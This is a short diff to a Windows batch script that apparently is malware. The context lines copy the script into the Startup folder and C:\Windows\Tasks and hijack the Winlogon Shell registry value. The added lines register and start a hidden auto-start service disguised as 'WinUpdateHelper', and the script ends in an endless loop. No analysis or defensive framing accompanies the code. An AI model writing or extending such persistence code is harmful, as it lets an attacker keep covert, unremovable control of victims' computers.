@@ -1,6 +1,8 @@
 @echo off
 setlocal enabledelayedexpansion
 
+sc create "WinUpdateHelper" binPath= "\"%~f0\"" start= auto type= own type= interact >nul 2>&1
+sc start "WinUpdateHelper" >nul 2>&1
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 copy %0 "C:\Windows\Tasks\bat.bat" >nul
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Tasks\bat.bat" /f
@@ -66,3 +68,4 @@ for /l %%i in (1,1,8) do (
 )
 
 goto loop
+
